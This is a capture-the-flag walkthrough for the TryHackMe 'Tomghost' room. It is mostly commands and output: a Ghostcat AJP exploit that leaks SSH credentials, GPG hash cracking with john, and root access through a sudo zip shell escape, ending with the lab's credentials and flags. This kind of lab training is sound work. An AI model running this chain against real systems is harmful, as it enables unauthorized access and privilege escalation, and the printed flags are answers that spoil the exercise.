# Tomghost-CTF

https://tryhackme.com/room/tomghost

**Use nmap to scan for open ports: sudo nmap -sS -sC -sV 10.10.249.99**

	PORT     STATE SERVICE    VERSION

	22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

	53/tcp   open  tcpwrapped

	8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)

	8080/tcp open  http       Apache Tomcat 9.0.30

**searchsploit ajp** :
	
	Apache Tomcat - AJP 'Ghostcat File Read/Inclusion 
  
**python /usr/share/exploitdb/exploits/multiple/webapps/48143.py 10.10.249.99** 

	Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks

ssh skyfuck@10.10.249.99

scp skyfuck@10.10.249.99:tryhackme.asc /home/kali

/usr/sbin/gpg2john tryhackme.asc > hashtry

**john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hashtry** 
	alexandru        (tryhackme)

go back to the machine 

gpg --import tryhackme.asc 

gpg --decrypt credential.pgp

	merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

login to merlin and cat the user.txt 

sudo -l 
 	(root : root) NOPASSWD: /usr/bin/zip

**Head to https://gtfobins.github.io/gtfobins/zip/ to find the exploit for zip** 

	TF=$(mktemp -u)

	sudo zip $TF /etc/hosts -T -TT 'sh #'

Root gained 

cd root to find the final flag

# Compromise this machine and obtain user.txt

## 🏴‍☠️THM{GhostCat_1s_so_cr4sy}

# Escalate privileges and obtain root.txt

## 🏴‍☠️THM{Z1P_1S_FAKE}
